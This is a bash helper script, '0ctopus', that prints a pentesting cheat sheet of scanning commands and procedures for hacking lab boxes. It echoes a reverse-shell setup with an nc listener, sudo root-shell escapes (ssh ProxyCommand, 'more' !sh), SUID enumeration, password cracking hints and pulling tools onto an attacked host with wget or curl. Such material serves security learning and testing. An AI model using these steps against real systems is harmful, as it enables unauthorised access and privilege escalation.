#!/bin/bash
TEST_STRING=""

usage() {
	echo ""
        echo "This is 0ctopus. A hacking helper script."
	echo "It either provides help with information, or runs tools for you."
	echo ""
	echo "These are the flags for 0ctopus."
	echo ""
	echo "	Non-hacking related tools: -f <tool-name>"
	echo "	General tips, methods and procedures: -g <tool-name>"
	echo "	Help: -h"
	echo "	List of tools supported: -l"
	echo "	Information and syntax of a tool: -t <tool-name>"
}

list_tools() {

	echo ""
	echo "Tools and Procedures supported by 0ctopus, in alphabetical order:"
	echo ""
	echo "Tools (-t flag):"
	echo "	gobuster"
	echo "	nc"
	echo "	nmap"
	echo "	searchsploit"
	echo "	showmount"
	echo "	sudo"
	echo "	wfuzz"
	echo ""
	echo ""
	echo "Procedures (-g flag):"
	echo "	bettershell , Get a better shell when you have established a revshell"
	echo "	file-transfer , Transfer files or tools"
	echo "	general , General help"
	echo "	revshell , Generating and getting a reverse shell"
	echo "	privesc , Privilege escalation"
	echo "	passrecon , Passive Reconnaisance"
	echo "	ports , Which tools can be good to use when specific ports are open?"
	echo "	strategy , A guide to the strategy on how to do a pentest/hack of a box"
	echo ""
	echo ""
	echo "Tools, not hacking related (-f flag)"
	echo "	jq"


}

tips_filetransfer() {
	echo "Transfer a file/tool from local host to remote host"
	echo "	1.1) set up a webserver where you have your file/tool on you local host, so it can be downloaded: python3 -m http.server <port>"
	echo "	1.2) use either curl or wget from remote host to your local host to get the file. Remember to be in the /tmp folder on the attacked machine."
	echo "	  wget <local-ip>:<port>/<file-name>"
	echo "	  curl <local-ip>:<port>/<file-name>"
	echo ""
	echo "If you have ssh privileges or credentials you can simply use sftp. Assuming you are on the remote host, this is the command:"
	echo "	1) sftp -i <ssh-identity-file>@<remote-host>"
	echo "	2) Use get (or put) on a file to transfer it."
}

tips_general() {
	echo "1) Use the website book.hacktricks.xyz"
}

func_gobuster() {
	echo "Scan for paths: (1) gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o <output-file> -u http://<host>:<port>"
}

func_linpeass() {
	echo "linpeas scan: ./linpeas.sh"
}

func_nc() {
	echo "Set up listener on a port of your choosing: nc -lvp <port>"
}

func_nmap() {
	echo "Comprehensive scan (with status every 5 seconds):                 (1) nmap -sVC -p- -oA <output-name> --stats-every 5s <host>"
	echo "Fast scan (top 1000 popular ports):   				(2) nmap -sVC -oA <output-name> <host>"
	echo "UDP scan (top 1000 popular ports. All ports takes too long): 	(3) nmap -sVC -sU -oA <output-name> <host>"
	echo "List which addresses will be scanned: 				(4) nmap -sL <addresses/network>"
	echo ""
	echo "Tips:"
	echo "	You can give the output xml file to searchsploit to search for vulnerabilities:" 
	echo "                                      (4) searchsploit --nmap <output-name>.xml"
	echo ""
}

tips_revshell() {
	echo "Get a reverse shell from remote host to your local host"
	echo "	1.1) Set up a listener on your localhost using the command: nc -lvp <port>"
	echo "	1.2) Generate a reverse shell command using the website: revshell.com"
	echo "	1.3) Run the revshell command on your remote host to connect to your local host"
}

tips_privesc() {
	echo "Here are some tricks and tools you can use for privilege escalation"
	echo ""
	echo "	(1) Use linpeass.sh. A general privilege escalation scan"
	echo "		linpeass.sh"
	echo ""
	echo "	(2) Root ssh shell. If you have root ssh privileges, the following command will yield a root shell"
	echo "		sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
	echo ""
	echo "	(3) Use more. If you can sudo use more to read a file, you can run this command (while in more) to get root shell:"
	echo "		!sh"
	echo "	(4) See if you can use any tools that have SUID bit with the command:"
	echo "		find / -type f -perm -04000 -ls 2>/dev/null"
	echo "	      Can be used in conjunction with unshadow to crack passwords."
	echo "	      See also: https://gtfobins.github.io/"
}

tips_strategy() {
	echo "This is an example of a strategy on how to proceed with a box"
	echo ""
	echo "1) Run nmap on the ip address to see which ports are open and which services run on them. Along with some other info"
	echo ""
	echo "2) Run gobuster and wfuzz to get domains and paths. See < ./octopus.sh -t gobuster > and < ./octopus.sh -t wfuzz > respectively for usage"
	echo ""
	echo "3) If you have a website you can use Burp to investigate further "
	echo ""
	echo "4) See if you have any information about the software running. See if there may be some exploits for old software."
}

func_searchsploit() {
	echo "Some ways to use searchsploit"
	echo "	Use nmap output .xml file to search for vulnerabilities: searchsploit --nmap <file>.xml"
}
func_showmount() {
	echo "Shows information about an NFS server."
	echo "	Use the command to look for exports: showmount -e <ip>"
}

tips_passrecon() {

	echo "Passive reconnaisance is the act of gathering information about a system without directly interacting with it."
	echo ""
	echo "Here are some tools that may be good for this purpose:"
	echo "	whois"
	echo "	nslookup"
	echo "	dig"

}

func_sudo() {
	echo "See which sudo privileges you have: sudo -l"
}

func_wfuzz() {
	echo "Scan for domains: (1) wfuzz -c -z file,/<path-to>/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.<host>\" (--hc <return-code>/--hl <content-length>/--hh <chars>) http://<host>:<port> "
	echo "	where --hc filters out the specified return code, and --hl filters out the specified content size"
	echo ""
	echo "1) If your scan finds a new domain you may have to add it to your /etc/hosts file, if you have set a name for the host ip address"
}

tips_ports() {
	echo "When the following ports are open, which tools can yield more information, and which other tools can we use?"
	echo "	port (service) : scanner1, scanner2, ... : other_tool1, other_tool2, ..."
	echo ""
	echo "	22 (ssh) : ssh : sftp, scp  "
	echo "	80 (HTTP) : gobuster, wfuzz : Burp Suite"
	echo ""
	echo "	2049 (Network File System nfs) : showmount : mount"
	echo "----------ADD MORE PORTS--------------"

}

func_jq() {
	echo "JQ is tool to read json files and extract certain information."
	echo "Here are some tips:"
	echo ""
	echo "	Read json file from beginning: jq -C . <file> | less -R"
}

tips_bettershell() {
	echo "Here are some ways to get a better shell when you already have a reverse shell unless specified otherwise."
	echo ""
	echo "	(1) Upgrade to bash or sh shell. Type /bin/bash or /bin/sh into your shell."
	echo ""
	echo "	(2) Use Python. Run the following sequence of commands in your shell."
	echo "		1.1) python3 -c 'import pty; pty.spawn("/bin/bash")'"
	echo "		1.2) export TERM=xterm"
	echo "		1.3) Close the shell by running: ctrl+z"
	echo "		1.4) Run the command on the command line: stty raw -echo ; fg"
	echo ""
	echo "	(3) Use ssh. Using the shell, put your ssh credentials on the remote host so that you can ssh into it."
	echo ""
}

while getopts "lt:g:f:h" opt; do

	case "$opt" in

		l) 
			list_tools
			;;

		t)
			if [[ "$OPTARG" == "gobuster" ]]; then
				func_gobuster
			elif [[ "$OPTARG" == "nc" ]]; then
				func_nc
			elif [[ "$OPTARG" == "nmap" ]]; then
				func_nmap
			elif [[ "$OPTARG" == "searchsploit" ]]; then
				func_searchsploit
			elif [[ "$OPTARG" == "showmount" ]]; then
				func_showmount
			elif [[ "$OPTARG" == "sudo" ]]; then
				func_sudo
			elif [[ "$OPTARG" == "wfuzz" ]]; then
				func_wfuzz
			fi
			;;

		g)
			if [[ "$OPTARG" == "general" ]]; then
				tips_general
			elif [[ "$OPTARG" == bettershell ]]; then
				tips_bettershell
			elif [[ "$OPTARG" == "revshell" ]]; then
				tips_revshell
			elif [[ "$OPTARG" == "wfuzz" ]]; then
				tips_wfuzz
			elif [[ "$OPTARG" == "file-transfer" ]]; then
				tips_filetransfer
			elif [[ "$OPTARG" == "ports" ]]; then
				tips_ports
			elif [[ "$OPTARG" == "privesc" ]]; then
				tips_privesc
			elif [[ "$OPTARG" == "strategy" ]]; then
				tips_strategy
			elif [[ "$OPTARG" == "passrecon" ]]; then
				tips_passrecon
			fi
			;;

		f)
			if [[ "$OPTARG" == "jq" ]]; then
				func_jq
			fi
			;;


		h)
			usage
			;;

		*)
			usage
			exit 1
			;;
	esac
done


if [[ "$TEST_STRING" == "" ]]; then
	exit 1
fi
